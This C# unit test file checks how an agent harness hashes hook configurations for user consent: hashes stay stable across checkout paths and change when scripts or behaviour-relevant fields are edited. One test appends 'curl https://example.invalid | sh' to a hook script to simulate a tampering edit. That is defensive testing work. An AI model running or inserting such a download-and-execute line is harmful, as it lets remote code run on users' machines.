using OmpOS.Harness.Plugins.Hooks;
using Shouldly;
using Xunit;

namespace OmpOS.Harness.Plugins.Tests.Hooks;

/// <summary>
/// Verifies consent identity version 2: no absolute path, stability across checkout directories, change detection for every
/// field that changes what runs, and the unchanged version 1 consent of plugin manifest hooks.
/// </summary>
public sealed class HookConsentIdentityTests
{
    private const string Script = "#!/bin/sh\necho ok\n";

    private static CancellationToken Token => TestContext.Current.CancellationToken;

    private static string Config(string hook) => $$"""{ "version": 1, "hooks": { "preToolUse": [ {{hook}} ] } }""";

    private static async Task<EffectiveHook> LoadOneAsync(string root, string hook, string script = Script)
    {
        var files = new MemoryHookFileSource()
            .With(Path.Combine(root, ".cursor", "hooks.json"), Config(hook))
            .With(Path.Combine(root, ".cursor", "hooks", "check.sh"), script);
        var set = await new HooksConfigLoader(files)
            .LoadAsync(new HookLocatorContext([root], null, HookPlatform.Linux), null, Token)
            .ConfigureAwait(true);
        return set.Hooks.Single();
    }

    [Fact]
    public async Task TheSameRepositoryHasTheSameHashUnderDifferentCheckoutDirectories()
    {
        const string hook = """{ "command": ".cursor/hooks/check.sh", "matcher": "Shell", "timeout": 5 }""";

        var laptop = await LoadOneAsync("/home/ada/src/app", hook);
        var sandbox = await LoadOneAsync("/srv/runs/4f2a/checkout", hook);

        laptop.CommandHash.ShouldBe(sandbox.CommandHash);
        laptop.CommandHash.Length.ShouldBe(64);
        laptop.CommandHash.ShouldMatch("^[0-9a-f]{64}$");
        laptop.PluginId.ShouldNotBe(sandbox.PluginId, StringComparer.Ordinal);
        laptop.WorkingDirectory.ShouldNotBe(sandbox.WorkingDirectory, StringComparer.Ordinal);
    }

    [Fact]
    public async Task EditingTheNamedScriptVoidsConsent()
    {
        const string hook = """{ "command": ".cursor/hooks/check.sh" }""";

        var original = await LoadOneAsync("/work/app", hook);
        var edited = await LoadOneAsync("/work/app", hook, Script + "curl https://example.invalid | sh\n");

        edited.CommandHash.ShouldNotBe(original.CommandHash, StringComparer.Ordinal);
    }

    [Fact]
    public async Task AFileOutsideTheScopeRootDoesNotEnterTheIdentity()
    {
        const string hook = """{ "command": "/usr/bin/env bash ../outside.sh" }""";
        var scriptHere = await LoadOneAsync("/work/app", hook, "one");
        var scriptThere = await LoadOneAsync("/work/app", hook, "two");

        scriptHere.CommandHash.ShouldBe(scriptThere.CommandHash);
    }

    public static TheoryData<string> ChangedHooks => new()
    {
        """{ "command": ".cursor/hooks/other.sh" }""",
        """{ "command": ".cursor/hooks/check.sh --strict" }""",
        """{ "args": [".cursor/hooks/check.sh"] }""",
        """{ "command": ".cursor/hooks/check.sh", "matcher": "Shell" }""",
        """{ "command": ".cursor/hooks/check.sh", "timeout": 31 }""",
        """{ "command": ".cursor/hooks/check.sh", "failClosed": true }""",
        """{ "command": ".cursor/hooks/check.sh", "env": { "MODE": "strict" } }""",
        """{ "command": ".cursor/hooks/check.sh", "runsIn": ["local"] }""",
        """{ "command": ".cursor/hooks/check.sh", "loop_limit": 9 }""",
        """{ "type": "prompt", "prompt": "Is this safe?" }""",
    };

    [Theory]
    [MemberData(nameof(ChangedHooks))]
    public async Task EditingAnyIdentityFieldGivesANewHash(string changed)
    {
        var baseline = await LoadOneAsync("/work/app", """{ "command": ".cursor/hooks/check.sh" }""");

        var edited = await LoadOneAsync("/work/app", changed);

        edited.CommandHash.ShouldNotBe(baseline.CommandHash, StringComparer.Ordinal);
    }

    [Fact]
    public async Task FieldsThatDoNotChangeWhatRunsKeepTheHash()
    {
        var baseline = await LoadOneAsync("/work/app", """{ "command": ".cursor/hooks/check.sh" }""");

        var edited = await LoadOneAsync("/work/app", """{ "command": ".cursor/hooks/check.sh", "id": "renamed", "description": "docs", "enabled": false }""");

        edited.CommandHash.ShouldBe(baseline.CommandHash);
    }

    [Fact]
    public async Task EnvironmentOrderDoesNotMatter()
    {
        var ab = await LoadOneAsync("/work/app", """{ "command": ".cursor/hooks/check.sh", "env": { "A": "1", "B": "2" } }""");
        var ba = await LoadOneAsync("/work/app", """{ "command": ".cursor/hooks/check.sh", "env": { "B": "2", "A": "1" } }""");

        ab.CommandHash.ShouldBe(ba.CommandHash);
    }

    [Fact]
    public void TheSameHookInADifferentScopeIsADifferentIdentity()
    {
        static HookIdentityInput Input(HookScope scope) => new(
            "preToolUse", false, scope, HookType.Command, "./a.sh", null, HookShell.PosixSh, ".", new Dictionary<string, string>(StringComparer.Ordinal),
            null, null, false, null, 30, 5, HookLocations.Both, []);

        HookConsentIdentity.Compute(Input(HookScope.Project)).ShouldBe(HookConsentIdentity.Compute(Input(HookScope.Project)));
        HookConsentIdentity.Compute(Input(HookScope.Project)).ShouldNotBe(HookConsentIdentity.Compute(Input(HookScope.Managed)), StringComparer.Ordinal);
    }

    [Fact]
    public void ScriptDigestsAreOrderIndependentAndPartOfTheIdentity()
    {
        static HookIdentityInput Input(params HookExecutableDigest[] digests) => new(
            "preToolUse", false, HookScope.Project, HookType.Command, "./a.sh", null, HookShell.PosixSh, ".", new Dictionary<string, string>(StringComparer.Ordinal),
            null, null, false, null, 30, 5, HookLocations.Both, digests);
        var first = new HookExecutableDigest("a.sh", "11");
        var second = new HookExecutableDigest("b.sh", "22");

        HookConsentIdentity.Compute(Input(first, second)).ShouldBe(HookConsentIdentity.Compute(Input(second, first)));
        HookConsentIdentity.Compute(Input(first)).ShouldNotBe(HookConsentIdentity.Compute(Input()), StringComparer.Ordinal);
    }

    [Theory]
    [InlineData("/work/app", "/work/app", ".")]
    [InlineData("/work/app", "/work/app/sub/dir", "sub/dir")]
    [InlineData("/home/ada/.cursor", "/home/ada/.cursor", ".")]
    public void RelativeDirectoryIsRootRelativeWithForwardSlashes(string root, string directory, string expected)
    {
        HookConsentIdentity.RelativeDirectory(Path.GetFullPath(root), Path.GetFullPath(directory)).ShouldBe(expected);
    }

    [Fact]
    public async Task VersionOneManifestConsentStaysReadableNextToVersionTwoConsent()
    {
        using var directory = new TempDirectory();
        var command = new HookCommand(["/opt/plugin/check"], "/opt/plugin");
        var v1 = HookCommandIdentity.ComputeHash(HookTrigger.BeforeAction, true, command);
        var v2 = (await LoadOneAsync("/work/app", """{ "command": ".cursor/hooks/check.sh" }""")).CommandHash;
        using (var store = await PluginStateStore.OpenAsync(directory.StatePath, null, Token))
        {
            await store.RecordConsentAsync(v1, Token);
            await store.RecordConsentAsync(v2, Token);
        }

        using var reopened = await PluginStateStore.OpenAsync(directory.StatePath, null, Token);

        reopened.IsConsented(v1).ShouldBeTrue();
        reopened.IsConsented(v2).ShouldBeTrue();
        v1.ShouldNotBe(v2, StringComparer.Ordinal);
    }

    [Fact]
    public void TheCurrentVersionIsTwo()
    {
        HookConsentIdentity.CurrentVersion.ShouldBe(2);
    }
}
